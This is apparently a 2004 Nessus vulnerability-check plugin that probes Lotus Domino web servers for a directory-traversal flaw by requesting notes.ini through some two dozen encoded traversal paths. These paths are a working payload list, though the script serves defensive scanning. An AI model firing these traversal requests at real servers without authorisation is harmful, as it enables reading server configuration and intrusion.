# Copyright (C) 2000 - 2004 Net-Square Solutions Pvt Ltd.
# By: Hemil Shah
# Desc: This script will check for the notes.ini file in the remote web server.

if(description)
{
        script_id(12248);
        script_version ("$Revision: 1.5 $");
        name["english"] = "notes.ini checker";
        script_name(english:name["english"]);
        desc["english"] = 
" This plugin attempts to determine the existence of a directory traversal 
bug on the remote Lotus Domino Web server

Risk: High";

        script_description(english:desc["english"]);
        summary["english"] = "notes.ini checker";
        script_summary(english:summary["english"]);
        script_category(ACT_ATTACK);
        script_copyright(english:"This script is Copyright (C) 2004 Net-Square Solutions Pvt Ltd.");
        family["english"] = "Misc.";
        script_family(english:family["english"]);
        script_dependencie("http_version.nasl");
        script_require_ports("Services/www", 80);
        exit(0);
}



# start script

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(! get_port_state(port))
    exit(0);

if ( get_kb_item("www/no404/" + port ) ) exit(0);

banner = get_http_banner(port:port);
if ( "Domino" >!< banner ) exit(0);

DEBUG = 0;

req = http_get(item:"../../../../whatever.ini", port:port); 
res = http_keepalive_send_recv(port:port, data:req);
if ( res == NULL ) exit(0);

if (ereg(pattern:"^HTTP/[01]\.[01] 200 ", string:res)  ) exit (0);

dirs[0] = "/%00%00.nsf/../lotus/domino/notes.ini";
dirs[1] = "/%00%20.nsf/../lotus/domino/notes.ini";
dirs[2] = "/%00%c0%af.nsf/../lotus/domino/notes.ini";
dirs[3] = "/%00...nsf/../lotus/domino/notes.ini";
dirs[4] = "/%00.nsf//../lotus/domino/notes.ini";
dirs[5] = "/%00.nsf/../lotus/domino/notes.ini";
dirs[6] = "/%00.nsf/..//lotus/domino/notes.ini";
dirs[7] = "/%00.nsf/../../lotus/domino/notes.ini";
dirs[8] = "/%00.nsf.nsf/../lotus/domino/notes.ini";
dirs[9] = "/%20%00.nsf/../lotus/domino/notes.ini";
dirs[10] = "/%20.nsf//../lotus/domino/notes.ini";
dirs[11] = "/%20.nsf/..//lotus/domino/notes.ini";
dirs[12] = "/%c0%af%00.nsf/../lotus/domino/notes.ini";
dirs[13] = "/%c0%af.nsf//../lotus/domino/notes.ini";
dirs[14] = "/%c0%af.nsf/..//lotus/domino/notes.ini";
dirs[15] = "/...nsf//../lotus/domino/notes.ini";
dirs[16] = "/...nsf/..//lotus/domino/notes.ini";
dirs[17] = "/.nsf///../lotus/domino/notes.ini";
dirs[18] = "/.nsf//../lotus/domino/notes.ini";
dirs[19] = "/.nsf//..//lotus/domino/notes.ini";
dirs[20] = "/.nsf/../lotus/domino/notes.ini";
dirs[21] = "/.nsf/../lotus/domino/notes.ini";
dirs[22] = "/.nsf/..///lotus/domino/notes.ini";
dirs[23] = "/.nsf%00.nsf/../lotus/domino/notes.ini";
dirs[24] = "/.nsf.nsf//../lotus/domino/notes.ini";

report = string("The Lotus Domino Web server is vulnerable to a directory-traversal attack\n");


for (i=0; dirs[i]; i++)
{  
	req = http_get(item:dirs[i], port:port); 
	res = http_keepalive_send_recv(port:port, data:req);
	if ( res == NULL ) exit(0);

       
        if(ereg(pattern:"^HTTP/[01]\.[01] 200 ", string:res)  )
        {
	    if ("DEBUG" >< res)
	    {
	    	report = report + string("specifically, the request for ", dirs[i], " appears\n");
            	report = report + string("to have retrieved the notes.ini file.  See also:\n");
	    	report = report + string("http://www.securityfocus.com/archive/101/155904/2001-01-08/2001-01-14/0\n");
            	security_hole(port:port, data:report);            
            	exit(0);
	    }
        }
}
